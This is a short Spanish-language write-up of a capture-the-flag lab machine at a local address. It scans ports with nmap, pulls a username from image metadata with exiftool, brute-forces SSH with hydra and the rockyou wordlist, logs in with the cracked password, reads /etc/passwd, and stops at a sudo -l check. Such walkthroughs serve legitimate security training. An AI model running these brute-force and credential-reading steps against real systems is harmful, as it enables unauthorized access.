### Maquina borazuwarahctf

## Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.2

![alt text](image-4.png)

## Entramos en la web

http://172.17.0.2

y vemos una imagen, la descargamos:

![alt text](image-5.png)

wget http://172.17.0.2/imagen.jpeg

exiftool imagen.jpeg

![alt text](image-6.png)

hacemos un ataque con hydra a ssh

hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

![alt text](image-7.png)


## Intrusion 
entramos por ssh con las credenciales encontradas

ssh borazuwarah@172.17.0.2 -> 123456

hacemos un cat /etc/passwd | grep bash -> para ver los usuarios en el Sistema Operativo

root:x:0:0:root:/root:/bin/bash
borazuwarah:x:1000:1000::/home/borazuwarah:/bin/bash

## Escalar privilegios

hacemos un sudo -l

![alt text](image-8.png)